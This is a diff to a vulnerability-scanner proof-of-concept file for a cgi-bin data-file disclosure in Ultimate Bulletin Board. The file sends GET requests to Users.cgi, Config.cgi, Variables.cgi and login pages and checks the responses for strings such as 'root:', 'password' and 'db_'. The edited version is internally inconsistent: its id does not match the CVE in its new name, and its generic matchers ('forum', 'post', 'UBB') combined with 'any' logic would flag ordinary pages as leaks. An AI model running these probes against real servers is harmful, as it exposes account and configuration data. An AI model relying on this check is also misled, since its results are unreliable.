@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Ultimate Bulletin Board 将数据文件（如 members.txt）存储在 cgi-bin 目录下，远程攻击者通过 HTTP GET 请求直接访问这些文件路径，若服务器尝试以 CGI 执行失败则返回文件明文内容，导致敏感信息泄露。"
+description = "Ultimate Bulletin Board 将数据文件存储在 cgi-bin 可执行目录中，当 HTTP 服务器尝试执行这些数据文件时触发执行错误，导致文件内容以明文形式返回给远程攻击者，造成敏感数据（用户帐号、密码哈希、配置信息）泄露。"
 id = "POC-AVE-1999-0653"
-name = "Ultimate Bulletin Board 数据文件泄露 PoC"
+name = "CVE-1999-0854 Ultimate Bulletin Board cgi-bin 目录敏感信息泄露 PoC"
 severity = "medium"
 tags = ["ave-1999-0653"]
 vuln_id = [
@@ -15,30 +15,158 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cgi-bin/members.txt"
+path = "/cgi-bin/ubb/Users.cgi"
 protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "username",
+    "root:",
     "password",
-    "email",
-    "Member",
+    "username",
+    "admin",
 ]
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cgi-bin/ubb_forum_topic.cgi"
+path = "/cgi-bin/ubb/Config.cgi"
 protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "Content-Type: text/html",
-    "Content-Type: text/plain",
+    "$config",
+    "db_",
+    "sql_",
+    "password",
+    "admin",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/ubb/Forums.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "forum",
+    "category",
+    "topic",
+    "post",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/ultimatebb.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Ultimate Bulletin Board",
+    "UBB",
+    "Infopop",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/ultimatebb.cgi?action=intro"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Ultimate Bulletin Board",
+    "Welcome to",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/ultimatebb.cgi?action=login"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Ultimate Bulletin Board",
+    "UBB",
+    "login",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/ubb/Variables.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "$vars",
+    "config",
+    "path",
+    "url",
 ]
